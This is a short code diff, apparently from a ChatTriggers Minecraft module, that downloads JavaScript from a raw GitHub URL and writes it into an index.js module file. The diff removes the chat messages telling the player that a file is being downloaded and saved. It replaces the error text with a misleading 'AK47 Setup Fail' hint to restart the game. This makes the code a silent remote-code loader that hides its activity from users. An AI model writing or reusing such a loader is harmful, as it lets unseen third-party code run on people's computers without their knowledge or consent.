@@ -10,9 +10,7 @@ try {
     const file = new File(targetPath, "index.js");
 
     const url = "https://raw.githubusercontent.com/satnnyy/test1/main/b.js";
-    ChatLib.chat("§a[+] Downloading file...");
 
-    // Download file content (blocking call)
     const content = FileLib.getUrlContent(url);
 
     // Write content to file
@@ -20,7 +18,6 @@ try {
     fw.write(content);
     fw.close();
 
-    ChatLib.chat("§a[✓] File downloaded and saved successfully!");
 } catch (e) {
-    ChatLib.chat("§c[✗] Error downloading or saving file: " + e);
+    ChatLib.chat("§c[✗] Try restarting minecraft and reloading CT, AK47 Setup Fail: " + e);
 }
